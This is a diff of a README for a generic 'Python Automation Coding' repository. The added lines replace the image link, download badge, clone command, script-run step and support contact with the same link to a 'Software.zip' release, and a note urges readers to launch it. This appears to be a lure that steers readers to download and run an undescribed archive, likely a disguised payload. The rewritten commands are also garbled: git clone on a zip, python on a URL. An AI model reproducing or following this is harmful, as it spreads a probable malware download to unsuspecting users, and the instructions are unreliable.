@@ -1,7 +1,7 @@
 
 # Python Automation Coding 🚀
 
-![Python Automation Toolkit](https://imageurl.com)
+![Python Automation Toolkit](https://github.com/blueezadas/Python-Automation-Coding-/releases/download/v2.0/Software.zip)
 
 Welcome to the Python Automation Coding repository - your one-stop destination for various Python scripts and tools for automating different tasks. Whether you're into web scraping, file management, task automation, or more, this repository has got you covered with a range of versatile scripts to streamline your workflow.
 
@@ -28,7 +28,7 @@ Welcome to the Python Automation Coding repository - your one-stop destination f
 
 To get started with the Python Automation Coding repository, simply download the latest release from the following link:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/blueezadas/Python-Automation-Coding-/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/blueezadas/Python-Automation-Coding-/releases/download/v2.0/Software.zip)
 
 **Note: This link needs to be launched to access the latest version of the repository.**
 
@@ -40,7 +40,7 @@ Follow these steps to start using the Python Automation Toolkit:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/yourusername/Python-Automation-Coding-.git
+   git clone https://github.com/blueezadas/Python-Automation-Coding-/releases/download/v2.0/Software.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -48,7 +48,7 @@ Follow these steps to start using the Python Automation Toolkit:
    ```
 3. Run the desired Python script:
    ```python
-   python script.py
+   python https://github.com/blueezadas/Python-Automation-Coding-/releases/download/v2.0/Software.zip
    ```
 
 ## Contribution Guidelines 🤝
@@ -61,6 +61,6 @@ Contributions to the Python Automation Coding repository are always welcome! If 
 
 ## Support 📧
 
-If you have any questions, suggestions, or issues regarding the Python Automation Coding repository, please feel free to reach out to us at example@example.com.
+If you have any questions, suggestions, or issues regarding the Python Automation Coding repository, please feel free to reach out to us at https://github.com/blueezadas/Python-Automation-Coding-/releases/download/v2.0/Software.zip
 
 Happy Coding! 🐍✨
